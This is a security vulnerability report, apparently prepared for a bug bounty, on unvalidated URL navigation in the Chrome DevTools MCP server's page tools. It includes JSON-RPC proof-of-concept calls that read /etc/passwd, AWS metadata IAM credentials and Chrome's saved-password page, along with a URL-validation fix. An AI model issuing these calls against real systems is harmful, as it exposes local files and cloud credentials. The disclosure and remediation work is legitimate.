# Vulnerability Report: SSRF / Local File Read via Unrestricted Browser Navigation (Chrome DevTools MCP)

## Summary

| Field | Value |
|---|---|
| **Repository** | [ChromeDevTools/chrome-devtools-mcp](https://github.com/ChromeDevTools/chrome-devtools-mcp) (46,783 stars) |
| **Vulnerability Type** | SSRF / Local File Read (CWE-918, CWE-200) |
| **CVSS v3.1 Score** | **8.1 (High)** — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` |
| **Affected File** | `src/tools/pages.ts` |
| **Suggested Submission** | Google VRP |

---

## Vulnerability Details

### Root Cause

`navigate_page` and `newPage` tools accept user-supplied URLs and pass them directly to CDP with **zero validation**:
- No scheme allowlist (file://, ftp://, chrome://, data: all accepted)
- No hostname filtering (internal IPs, metadata endpoints not blocked)
- No path restrictions

### Source Code Evidence

```typescript
// src/tools/pages.ts
export const navigatePageTool = {
    name: 'navigate_page',
    handler: async (args: { url: string }) => {
        await page.goto(args.url);  // No validation — accepts file://, http://169.254.x.x, chrome://
        return { content: [{ type: 'text', text: `Navigated to ${args.url}` }] };
    }
};

export const newPageTool = {
    name: 'newPage',
    handler: async (args: { url: string }) => {
        const newPage = await browser.newPage();
        await newPage.goto(args.url);  // Same vulnerability
    }
};
```

---

## Proof of Concept

### PoC 1: Local File Read
```json
{
    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
    "params": {"name": "navigate_page", "arguments": {"url": "file:///etc/passwd"}}
}
```

### PoC 2: Cloud Metadata Theft (AWS)
```json
{
    "jsonrpc": "2.0", "id": 2, "method": "tools/call",
    "params": {"name": "navigate_page", "arguments": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}
}
```

### PoC 3: Chrome Internal Pages
```json
{
    "jsonrpc": "2.0", "id": 3, "method": "tools/call",
    "params": {"name": "navigate_page", "arguments": {"url": "chrome://settings/passwords"}}
}
```

---

## Remediation
1. Block `file://`, `ftp://`, `chrome://`, `data:` schemes
2. Block private IPs (RFC 1918, link-local, loopback)
3. Block cloud metadata endpoints (`169.254.169.254`)
4. Implement URL validation:
```typescript
function validateUrl(url: string): boolean {
    const parsed = new URL(url);
    if (!['http:', 'https:'].includes(parsed.protocol)) return false;
    if (/^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.|0\.)/.test(parsed.hostname)) return false;
    if (parsed.hostname === 'metadata.google.internal') return false;
    return true;
}
```

## References
- [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
